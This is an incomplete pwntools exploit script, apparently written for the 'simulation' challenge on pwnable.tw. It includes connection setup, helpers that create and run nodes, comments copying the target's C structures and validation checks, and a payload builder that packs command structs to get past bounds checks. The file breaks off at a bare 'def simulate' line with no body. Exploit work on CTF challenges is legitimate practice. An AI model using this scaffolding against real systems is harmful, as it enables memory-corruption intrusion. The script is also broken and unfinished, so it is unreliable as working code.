#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("simulation")

local = True 
if local:
    p = process("./simulation")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./simulation', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def new_node(idx, num_cmd, next_node, command, booll, handle):
    sla(b'>', b'1')
    sla(b':', str(idx))

    sla(b'Number of command: ', str(num_cmd))
    sla(b'Next node:', str(next_node))
    sla(b'Fill command list:', command)
    if booll == True:
      sla(b'Use default handler? (y/n):', b'y')
      sla(b'Input error handler:', str(handle))
    else:
      sla(b'Use default handler? (y/n): ', b'n')
    log.info('New_node_done!!!')

def run(node_head):
    sla(b'>', b'2')
    sla(b'Where to start?', str(node_head))
    log.info('Run_done!!!')

'''
#define CONSTANT 0
#define REGISTER 1
#define MEM 2
#define MAX_COUNT 0x100
enum COMMAND_TYPE
{
    ADD,
    SUBTRACT,
    MULTIPLY,
    DIVIDE,
    STORE,
    LOAD
};
struct arg
{
    size_t type;
    size_t val;
};
struct command
{
    size_t func;
    struct arg arg[3];
};
struct node
{
    uint32_t error_handler;
    uint32_t cur_cmd;
    uint32_t nb_cmd;
    uint32_t next_node;
    int (*error_callback)(struct node *, uint32_t, bool);
    struct command cmd[0];
};
uint32_t node_head;
struct node *node_list[MAX_COUNT];
uint32_t ip;
uint64_t re[5];
char *mem;
size_t mem_size;'''

'''
bool check_func(uint64_t func)
{
    if (func > LOAD)
    {
        return false;
    }
    return true;
}
'''
def cmd_struct(func, type_1, val_1, type_2, val_2, type_3, val_3, default, handle):
    payload = p64(func)                          #func <= LOAD
    payload += p64(type_1) + p64(val_1)          #type <= 2
    payload += p64(type_2) + p64(val_2)          #type == 1 thì val < 5
    payload += p64(type_3) + p64(val_3)          #type == 2 thì val < -1
    p.sendlineafter(b'Fill command list:', payload)

    if default == 1:
        p.sendlineafter(b'Use default handler? (y/n): ', b'Y')
        p.sendlineafter(b'Input default error handler: ', str(handle))
    else:
        p.sendlineafter(b'Use default handler? (y/n): ', b'N')


def simulate
p.interactive()